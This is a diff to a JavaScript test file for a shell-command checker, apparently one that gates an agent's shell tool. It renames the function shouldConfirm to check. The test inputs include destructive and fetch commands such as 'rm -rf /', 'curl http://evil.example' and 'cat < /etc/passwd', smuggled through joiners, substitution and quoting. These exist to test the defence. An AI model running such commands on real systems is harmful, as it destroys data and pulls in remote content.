@@ -1,14 +1,14 @@
 import { test } from "node:test";
 import { strict as assert } from "node:assert";
 import {
-  shouldConfirm,
+  check,
   isAllowed,
   hasDangerousPatterns,
   hasRedirectionOrSubstitution,
   hasFindAction,
   stripQuotedArgs,
   hasQuotedCommandSubstitution,
-} from "../src/command_check.js";
+} from "../src/tools/shell_command.js";
 
 test("isAllowed allows bare ls", () => {
   assert.ok(isAllowed("ls"));
@@ -51,45 +51,45 @@ test("hasDangerousPatterns detects joiners and substitution", () => {
   assert.equal(hasDangerousPatterns("ls -la"), false);
 });
 
-test("shouldConfirm auto-allows the repro command", () => {
-  assert.equal(shouldConfirm("ls && cat package.json | head -30"), false);
+test("check auto-allows the repro command", () => {
+  assert.equal(check("ls && cat package.json | head -30"), false);
 });
 
-test("shouldConfirm auto-allows simple allowed commands", () => {
-  assert.equal(shouldConfirm("ls"), false);
-  assert.equal(shouldConfirm("pwd"), false);
-  assert.equal(shouldConfirm("cat package.json"), false);
+test("check auto-allows simple allowed commands", () => {
+  assert.equal(check("ls"), false);
+  assert.equal(check("pwd"), false);
+  assert.equal(check("cat package.json"), false);
 });
 
-test("shouldConfirm allows allowed compound commands", () => {
-  assert.equal(shouldConfirm("ls && cat package.json"), false);
-  assert.equal(shouldConfirm("git status && git diff"), false);
-  assert.equal(shouldConfirm("ls | head -5"), false);
+test("check allows allowed compound commands", () => {
+  assert.equal(check("ls && cat package.json"), false);
+  assert.equal(check("git status && git diff"), false);
+  assert.equal(check("ls | head -5"), false);
 });
 
-test("shouldConfirm allows stripped stderr redirection", () => {
-  assert.equal(shouldConfirm("ls 2>&1"), false);
-  assert.equal(shouldConfirm("ls 2>/dev/null"), false);
+test("check allows stripped stderr redirection", () => {
+  assert.equal(check("ls 2>&1"), false);
+  assert.equal(check("ls 2>/dev/null"), false);
 });
 
-test("shouldConfirm rejects unknown commands", () => {
-  assert.ok(shouldConfirm("rm -rf /"));
-  assert.ok(shouldConfirm("curl http://evil.example"));
+test("check rejects unknown commands", () => {
+  assert.ok(check("rm -rf /"));
+  assert.ok(check("curl http://evil.example"));
 });
 
-test("shouldConfirm rejects compounds with a disallowed part", () => {
-  assert.ok(shouldConfirm("ls && rm -rf /"));
-  assert.ok(shouldConfirm("rm -rf / && ls"));
-  assert.ok(shouldConfirm("ls | rm -rf /"));
-  assert.ok(shouldConfirm("ls || rm -rf /"));
+test("check rejects compounds with a disallowed part", () => {
+  assert.ok(check("ls && rm -rf /"));
+  assert.ok(check("rm -rf / && ls"));
+  assert.ok(check("ls | rm -rf /"));
+  assert.ok(check("ls || rm -rf /"));
 });
 
-test("shouldConfirm rejects multi-line commands", () => {
-  assert.ok(shouldConfirm("ls\nrm -rf /"));
+test("check rejects multi-line commands", () => {
+  assert.ok(check("ls\nrm -rf /"));
 });
 
-test("shouldConfirm rejects empty subcommands from leading joiners", () => {
-  assert.ok(shouldConfirm("&& ls"));
+test("check rejects empty subcommands from leading joiners", () => {
+  assert.ok(check("&& ls"));
 });
 
 test("hasRedirectionOrSubstitution detects > < and $(", () => {
@@ -100,23 +100,23 @@ test("hasRedirectionOrSubstitution detects > < and $(", () => {
   assert.equal(hasRedirectionOrSubstitution("ls -la"), false);
 });
 
-test("shouldConfirm forces confirmation on output redirection", () => {
-  assert.ok(shouldConfirm("cat package.json > /tmp/out"));
-  assert.ok(shouldConfirm("ls >> /tmp/log"));
+test("check forces confirmation on output redirection", () => {
+  assert.ok(check("cat package.json > /tmp/out"));
+  assert.ok(check("ls >> /tmp/log"));
 });
 
-test("shouldConfirm forces confirmation on input redirection", () => {
-  assert.ok(shouldConfirm("cat < /etc/passwd"));
+test("check forces confirmation on input redirection", () => {
+  assert.ok(check("cat < /etc/passwd"));
 });
 
-test("shouldConfirm forces confirmation on command substitution", () => {
-  assert.ok(shouldConfirm("cat $(rm -rf /)"));
-  assert.ok(shouldConfirm("echo $(curl http://evil.example)"));
+test("check forces confirmation on command substitution", () => {
+  assert.ok(check("cat $(rm -rf /)"));
+  assert.ok(check("echo $(curl http://evil.example)"));
 });
 
-test("shouldConfirm forces confirmation even when the base command is allowed", () => {
-  assert.ok(shouldConfirm("git status > /tmp/x"));
-  assert.ok(shouldConfirm("pwd | tee /tmp/x"));
+test("check forces confirmation even when the base command is allowed", () => {
+  assert.ok(check("git status > /tmp/x"));
+  assert.ok(check("pwd | tee /tmp/x"));
 });
 
 test("hasDangerousPatterns detects the semicolon joiner", () => {
@@ -124,15 +124,15 @@ test("hasDangerousPatterns detects the semicolon joiner", () => {
   assert.equal(hasDangerousPatterns("ls -la"), false);
 });
 
-test("shouldConfirm rejects semicolon-joined commands with a disallowed part", () => {
-  assert.ok(shouldConfirm("ls -la; rm -rf ~"));
-  assert.ok(shouldConfirm("ls;rm"));
-  assert.ok(shouldConfirm("ls 2>/dev/null; rm -rf ~"));
+test("check rejects semicolon-joined commands with a disallowed part", () => {
+  assert.ok(check("ls -la; rm -rf ~"));
+  assert.ok(check("ls;rm"));
+  assert.ok(check("ls 2>/dev/null; rm -rf ~"));
 });
 
-test("shouldConfirm allows semicolon-joined commands when every part is allowed", () => {
-  assert.equal(shouldConfirm("ls; cat package.json"), false);
-  assert.equal(shouldConfirm("pwd; echo hi"), false);
+test("check allows semicolon-joined commands when every part is allowed", () => {
+  assert.equal(check("ls; cat package.json"), false);
+  assert.equal(check("pwd; echo hi"), false);
 });
 
 test("hasRedirectionOrSubstitution detects backtick substitution", () => {
@@ -140,9 +140,9 @@ test("hasRedirectionOrSubstitution detects backtick substitution", () => {
   assert.equal(hasRedirectionOrSubstitution("ls -la"), false);
 });
 
-test("shouldConfirm rejects backtick command substitution", () => {
-  assert.ok(shouldConfirm("ls `id`"));
-  assert.ok(shouldConfirm("cat `rm -rf /`"));
+test("check rejects backtick command substitution", () => {
+  assert.ok(check("ls `id`"));
+  assert.ok(check("cat `rm -rf /`"));
 });
 
 test("hasFindAction detects destructive find expressions", () => {
@@ -155,20 +155,20 @@ test("hasFindAction detects destructive find expressions", () => {
   assert.equal(hasFindAction("ls -la"), false);
 });
 
-test("shouldConfirm rejects find with action expressions", () => {
-  assert.ok(shouldConfirm("find . -delete"));
-  assert.ok(shouldConfirm("find . -exec rm {} +"));
-  assert.ok(shouldConfirm("ls && find . -delete"));
-  assert.ok(shouldConfirm("ls; find . -delete"));
+test("check rejects find with action expressions", () => {
+  assert.ok(check("find . -delete"));
+  assert.ok(check("find . -exec rm {} +"));
+  assert.ok(check("ls && find . -delete"));
+  assert.ok(check("ls; find . -delete"));
 });
 
-test("shouldConfirm allows read-only find", () => {
-  assert.equal(shouldConfirm("find . -name '*.js'"), false);
-  assert.equal(shouldConfirm("find . -name x | head"), false);
+test("check allows read-only find", () => {
+  assert.equal(check("find . -name '*.js'"), false);
+  assert.equal(check("find . -name x | head"), false);
 });
 
-test("shouldConfirm rejects carriage-return-separated commands", () => {
-  assert.ok(shouldConfirm("ls\rrm -rf /"));
+test("check rejects carriage-return-separated commands", () => {
+  assert.ok(check("ls\rrm -rf /"));
 });
 
 test("stripQuotedArgs removes single- and double-quoted spans", () => {
@@ -198,36 +198,36 @@ test("hasQuotedCommandSubstitution detects $() and backticks", () => {
   assert.equal(hasQuotedCommandSubstitution("a;b > c"), false);
 });
 
-test("shouldConfirm allows metacharacters inside quoted strings", () => {
+test("check allows metacharacters inside quoted strings", () => {
   // Semicolon and > inside quotes are literal data, not operators.
-  assert.equal(shouldConfirm('grep "a;b" file'), false);
-  assert.equal(shouldConfirm('echo "a > b"'), false);
-  assert.equal(shouldConfirm('find . -name "*.txt"'), false);
-  assert.equal(shouldConfirm('git diff "file with space"'), false);
+  assert.equal(check('grep "a;b" file'), false);
+  assert.equal(check('echo "a > b"'), false);
+  assert.equal(check('find . -name "*.txt"'), false);
+  assert.equal(check('git diff "file with space"'), false);
 });
 
-test("shouldConfirm allows $() inside single quotes (literal)", () => {
+test("check allows $() inside single quotes (literal)", () => {
   // Single quotes are fully literal, so no execution happens.
-  assert.equal(shouldConfirm("echo '$(rm -rf /)'"), false);
-  assert.equal(shouldConfirm("find . -name '-delete'"), false);
+  assert.equal(check("echo '$(rm -rf /)'"), false);
+  assert.equal(check("find . -name '-delete'"), false);
 });
 
-test("shouldConfirm forces confirmation on $() inside double quotes", () => {
-  assert.ok(shouldConfirm('echo "$(rm -rf /)"'));
-  assert.ok(shouldConfirm('cat "$(curl http://evil.example)"'));
+test("check forces confirmation on $() inside double quotes", () => {
+  assert.ok(check('echo "$(rm -rf /)"'));
+  assert.ok(check('cat "$(curl http://evil.example)"'));
 });
 
-test("shouldConfirm forces confirmation on backticks inside double quotes", () => {
-  assert.ok(shouldConfirm('echo "`id`"'));
-  assert.ok(shouldConfirm('cat "`rm -rf /`"'));
+test("check forces confirmation on backticks inside double quotes", () => {
+  assert.ok(check('echo "`id`"'));
+  assert.ok(check('cat "`rm -rf /`"'));
 });
 
-test("shouldConfirm forces confirmation on escaped quotes that stay literal", () => {
+test("check forces confirmation on escaped quotes that stay literal", () => {
   // "a\"b" is the literal a"b with no substitution.
-  assert.equal(shouldConfirm('echo "a\\"b"'), false);
+  assert.equal(check('echo "a\\"b"'), false);
 });
 
-test("shouldConfirm forces confirmation on unterminated quotes", () => {
-  assert.ok(shouldConfirm("echo 'unterminated"));
-  assert.ok(shouldConfirm('echo "unterminated'));
+test("check forces confirmation on unterminated quotes", () => {
+  assert.ok(check("echo 'unterminated"));
+  assert.ok(check('echo "unterminated'));
 });
